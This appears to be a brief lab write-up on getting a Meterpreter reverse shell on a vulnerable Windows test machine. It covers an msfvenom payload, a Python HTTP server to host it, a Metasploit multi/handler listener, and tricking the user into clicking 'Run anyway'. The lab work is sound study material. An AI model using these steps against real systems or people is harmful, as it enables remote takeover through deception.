Windows Exploitation (Reverse Shell) - this exploit made using vuln windows dont try unethical

This project focused on creating custom malware to gain a Meterpreter session on a Windows target.

Phase 1: Payload Creation & Listener Setup

The goal was to build the malware and set up the Kali machine to receive the connection.

Identify Kali IP (LHOST): Found the Kali machine's IP, 192.168.29.95, which the victim machine would call back to.

Create Payload: Used msfvenom to generate hack.exe with a windows/meterpreter/reverse_tcp payload.

Start HTTP Server: Used Python's simple HTTP server (python3 -m http.server 1234) to make hack.exe easily downloadable by the Windows machine.

Load Listener: Started Metasploit and loaded the generic handler: use multi/handler.

Configure Listener: Set the payload and the listening IP: set payload windows/meterpreter/reverse_tcp and set LHOST 192.168.29.95.

Start Waiting: Ran the handler using run to start passively listening for the connection.

Phase 2: Delivery and Control
The final steps involved tricking the Windows user into running the file and taking control of the session.

Download Payload: On the Windows machine, used the browser to download hack.exe from the Kali server.

Execute Payload: The user ran the file, clicking "Run anyway" to bypass the security warning.

Session Established: The listener caught the callback, and a Meterpreter session opened.

Post-Exploitation: Used the Meterpreter command shell to switch to a standard Windows command prompt and ran whoami to confirm the current user: Targret_Machine.
